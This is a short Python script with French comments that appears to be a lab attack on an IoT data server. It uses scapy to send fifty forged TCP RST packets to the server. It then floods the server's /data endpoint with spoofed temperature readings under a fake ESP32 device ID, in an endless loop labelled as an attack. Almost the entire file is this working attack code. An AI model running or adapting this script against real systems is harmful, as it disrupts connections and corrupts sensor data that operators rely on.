import requests
import json
import time
from scapy.all import IP, TCP, send


# A MODIFER AU BESOIN
server_ip = "192.168.1.19"
server_port = 80# URL du serveur A MODIFIER 
server_url = "http://"+server_ip+":"+str(server_port) +"/data"

# Id du device A MODIFIER
device_id = "ESP32-001"

# Données a MODIFIER
temperature = 2.52 # A modifier



for e in range(0,50,1) :
	rst_packet = IP(dst=server_ip) / TCP(dport=server_port, flags="R", seq=100)
	# Envoi du paquet
	send(rst_packet)
	time.sleep(0.1)


# Données JSON à envoyer
data = {
    "id": device_id,
    "temperature": temperature
}

# En-têtes de la requête (optionnel, mais recommandé pour spécifier le type de contenu)
headers = {
    "Content-Type": "application/json"
}

print("Depart Attaque")
while True:
    
    print("----->Envoi donnee erronee")
    response = requests.post(server_url, data=json.dumps(data), headers=headers)

    # Affichage de la réponse du serveur
    if response.status_code == 200:
        print("Réponse du serveur :", response.text)
    else:
        print(f"Erreur d'envoi : {response.status_code}, {response.text}")

    time.sleep(0.2)
